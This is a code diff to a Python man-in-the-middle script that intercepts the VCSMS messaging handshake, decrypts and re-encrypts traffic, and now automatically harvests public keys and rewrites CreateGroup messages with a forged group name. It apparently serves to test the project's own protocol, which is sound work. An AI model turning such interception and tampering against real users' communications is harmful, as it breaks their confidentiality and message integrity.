@@ -3,21 +3,22 @@ import random
 import socket
 import threading
 import argparse
-import subprocess
-import os
+import string
 import sys
 
 sys.path.append("..")
 from vcsms.cryptography.exceptions import CryptographyException
 from vcsms.improved_socket import ImprovedSocket
 from vcsms.message_parser import MessageParser
-from vcsms.cryptography import dhke, sha256, utils, aes256
+from vcsms.cryptography import dhke, sha256, utils, aes256, rsa
 from vcsms.client import OUTGOING_MESSAGE_TYPES
 from vcsms.client import INCOMING_MESSAGE_TYPES
 from vcsms import signing, keys
 
 MODIFY_LOCK = threading.Lock()
-MESSAGE_PARSER = MessageParser(INCOMING_MESSAGE_TYPES, OUTGOING_MESSAGE_TYPES, {})
+message_types = INCOMING_MESSAGE_TYPES
+message_types.update(OUTGOING_MESSAGE_TYPES)
+MESSAGE_PARSER = MessageParser(message_types, message_types, {})
 
 def forward(fsock: ImprovedSocket, tsock: ImprovedSocket):
     data = fsock.recv()
@@ -34,6 +35,7 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
     try:
         s_dh_pubkey = int(s_dh_packet.split(b':')[0], 16)
     except ValueError:
+        print("Server diffie hellman key malformed")
         return (0, 0)
     print("Server sent diffie hellman public key")
     s_secret = dhke.calculate_shared_key(m_dh_privkey, s_dh_pubkey, dhke.group14_2048) 
@@ -43,6 +45,7 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
     try:
         c_dh_pubkey = int(c_dh_packet.split(b':')[0], 16)
     except ValueError:
+        print("Client diffie hellman key malformed")
         return (0, 0)
     print("Client sent diffie hellman public key")
     c_secret = dhke.calculate_shared_key(m_dh_privkey, c_dh_pubkey, dhke.group14_2048)
@@ -54,6 +57,7 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
         iv = int(iv_hex, 16)
         ciphertext = bytes.fromhex(ciphertext_hex.decode('utf-8'))
     except:
+        print("Server sent malformed challenge")
         return (0, 0)
     print("Server sent encrypted challenge")
     try:
@@ -74,13 +78,17 @@ def mitm_handshake(c: ImprovedSocket, s: ImprovedSocket, c_privkey: tuple, s_pri
     try:
         c_answer = bytes.fromhex(c_response.decode('utf-8'))
     except:
+        print("Client sent malformed challenge response")
         return (0, 0)
     if c_answer != answer:
+        print("Client failed challenge")
         return (0, 0)
     c.send(b'OK')  # inform client they were correct
     print("Handshake completed successfully") 
     return (s_key, c_key)
 
+keyrequests = {}
+publickeys = {}
 def capture(f_sock: ImprovedSocket, t_sock: ImprovedSocket, f_enc_key: int, t_enc_key: int, direction: str):
     while f_sock.connected and t_sock.connected:
         raw = f_sock.recv()
@@ -88,30 +96,26 @@ def capture(f_sock: ImprovedSocket, t_sock: ImprovedSocket, f_enc_key: int, t_en
         iv = int(iv_hex, 16)
         ciphertext = bytes.fromhex(ciphertext_hex.decode('utf-8'))
         data = aes256.decrypt_cbc(ciphertext, f_enc_key, iv)
-        sender, message_type, parameters = MESSAGE_PARSER.parse_message(data)
-        print(f'MESSAGE OF TYPE {message_type} {direction} {sender}')
-        if input("Modify message data (y/N)? ").lower() == 'y':
-            modified = modify(data)
-        else:
-            modified = data
+        client_id, message_type, parameters = MESSAGE_PARSER.parse_message(data)
+        print(f'MESSAGE OF TYPE {message_type} {direction} {client_id}')
+        modified = data
+        if message_type == "GetKey":
+            request_index, requested_id = parameters
+            keyrequests[request_index] = requested_id
+        elif message_type == "KeyFound":
+            request_index, exp, mod = parameters
+            print(f"Got public key for {keyrequests[request_index]}")
+            publickeys[keyrequests[request_index]] = (exp, mod)
+        elif message_type == "CreateGroup":
+            name, signature, group_id, members = parameters
+            print("Randomly generating group name...")
+            new_group_name = random.choice(string.ascii_letters + string.digits).encode('utf-8')
+            print(f"Changing group name to {new_group_name}")
+            print(f"Encrypting name using {client_id}'s public key")
+            encrypted_group_name = rsa.encrypt(new_group_name, *(publickeys[client_id]))
+            modified = MESSAGE_PARSER.construct_message(client_id, "CreateGroup", encrypted_group_name, signature, group_id, members)
         reencrypted = aes256.encrypt_cbc(modified, t_enc_key, iv)
         t_sock.send(iv_hex + b':' + reencrypted.hex().encode('utf-8'))
-
-def modify(data: bytes):
-    with MODIFY_LOCK:
-        with open("/tmp/interceptedmessage", 'wb+') as f:
-            f.write(data)
-        editor = os.environ["EDITOR"]
-        if "vi" in editor:
-            subprocess.run([editor, "-b", "/tmp/interceptedmessage"])
-        elif "nano" in editor:
-            subprocess.run([editor, "-LN", "/tmp/interceptedmessage"])
-        else:
-            subprocess.run([editor, "/tmp/interceptedmessage"])
-        with open("/tmp/interceptedmessage", 'rb') as f:
-            modified = f.read()
-        subprocess.run(["rm", "/tmp/interceptedmessage"])
-    return modified 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
